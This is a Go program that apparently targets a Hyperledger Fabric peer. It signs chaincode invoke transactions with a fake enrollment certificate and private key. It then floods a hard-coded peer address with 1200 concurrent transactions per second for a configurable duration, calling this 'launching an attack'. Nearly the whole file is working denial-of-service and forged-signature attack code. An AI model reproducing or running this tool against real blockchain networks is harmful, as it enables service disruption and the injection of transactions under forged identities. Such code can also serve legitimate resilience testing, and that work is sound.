package main
import (
	"fmt"
	"os"
	"github.com/hyperledger/fabric/core/peer"
	"github.com/golang/protobuf/proto"
	"github.com/hyperledger/fabric/core/crypto/primitives"
	"github.com/hyperledger/fabric/core/util"
	pb "github.com/hyperledger/fabric/protos"
	context "golang.org/x/net/context"
	"tool/loadKey"
	"tool/initViper"
	"tool/transaction"
	"time"
	"flag"
)

const (
	localStore string = "/var/hyperledger/production/client/"
)



func Init() (err error) { //init the crypto layer
	securityLevel := 256
	hashAlgorithm := "SHA3"
	if err = primitives.InitSecurityLevel(hashAlgorithm, securityLevel); err != nil {
		panic(fmt.Errorf("Failed setting security level: %v", err))
		return err
	}

	return nil
}


func FakeSign(tx *pb.Transaction) (*pb.Transaction, error) {
	enrollmentCert, privKey, err := loadKey.LoadFakeEnrollment()
	if err != nil {
		fmt.Printf("Failed loading enrollment metieral")
		return nil, err
	}

	tx.Cert = enrollmentCert.Raw

	rawTx, err := proto.Marshal(tx)
	if err != nil {
		fmt.Printf("Failed marshaling tx: %v", err)
		return nil, err
	}

	rawSignature, err := primitives.ECDSASign(privKey, rawTx)
	if err != nil {
		fmt.Println("Failed Creating signature: %v", err)
		return nil, err
	}

	tx.Signature = rawSignature

	return tx, nil
}

func MakeFakeTx(chaincodeName string, args []string) *pb.Transaction {
	chaincodeInvocationSpec, err := transaction.InvokeChaincodeSpec(chaincodeName, args)
	if err != nil {
		os.Exit(0)
	}
	//fmt.Println(chaincodeInvocationSpec)

	tx, err := transaction.CreateInvokeTx(chaincodeInvocationSpec, util.GenerateUUID(), nil, chaincodeInvocationSpec.ChaincodeSpec.Attributes...)
	if err != nil {
		os.Exit(0)
	}

	tx, err = FakeSign(tx)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}

	return tx
}


func WarnningMsg() string{
//      var err error
        var str string
        str =  "Usage:\n     ./raiseInvocation [command]\n\n"
        str += "Available Commands:\n"
        str += "     invoke      Invoke the specified chaincode\n"
        str += "     query       Query the specified chaincode \ni\n"
        str += "Flags:\n     -n, --name string     Name of chaincode returned by the deploy teansaction"
        return str
}

func LaunchAttack(n int, address string, tx *pb.Transaction){
	c := make(chan int)		       //main exit after all go rutines were lanuched
	con, err := peer.NewPeerClientConnectionWithAddress(address)
	if err != nil {
		fmt.Println("Can't not connect: %v", err)
	}

	defer con.Close()
	client := pb.NewPeerClient(con)
	for i := 0 ; i < n ; i++ {
	   go func(){
		_, _ = client.ProcessTransaction(context.Background(), tx)
		c <- 1
	    }()
	}

        for s:= 0 ; s < n ; {
		s += <-c
	}


}//



func main() {
	var chaincodeName     string
	var timeout           int
	var dest	      string
	flag.StringVar(&chaincodeName, "n", "", "Name of chaincode returned by the deploy transaction")
	flag.IntVar(&timeout, "timeout", 1, "fake transaction duration")
	flag.StringVar(&dest, "d","172.22.28.134:7051", "destination to launch attack")


	Init()					//viper init
	err := initViper.SetConfig()
	if err != nil {
		panic(fmt.Errorf("Error loading viper config file"))
	}

	flag.Parse()

	tx := MakeFakeTx(chaincodeName,[]string{"a","b","1"})

	ticker := time.NewTicker(time.Second)
	now := time.Now()
	end := now.Add(time.Second * time.Duration(timeout))
	for tmp := now ; tmp.Before(end) ; {
		select {
			case <-ticker.C:
				start := time.Now()
				LaunchAttack(1200, dest, tx)
				end   := time.Now()
				delta := end.Sub(start)
				fmt.Printf("send 1200 txs per:%v\n", delta)
			default:
		}


		tmp = time.Now()
	}
	ticker.Stop()
	fmt.Println("Launch attack compelete")
}
